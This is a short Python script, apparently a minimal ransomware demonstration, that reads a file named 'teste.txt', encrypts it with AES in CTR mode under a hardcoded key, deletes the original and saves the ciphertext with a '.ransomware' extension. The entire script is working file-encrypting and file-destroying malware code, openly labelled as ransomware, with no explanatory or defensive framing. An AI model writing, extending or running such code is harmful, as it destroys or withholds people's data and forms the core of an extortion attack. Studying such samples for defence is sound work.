import os
import pyaes

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

key = b'1234567890123456'

aes = pyaes.AESModeOfOperationCTR(key)

encript_data = aes.encrypt(file_data)

os.remove(file_name)

new_file = 'teste.txt.ransomware'
new_file = open(new_file, 'wb')
new_file.write(encript_data)
new_file.close()
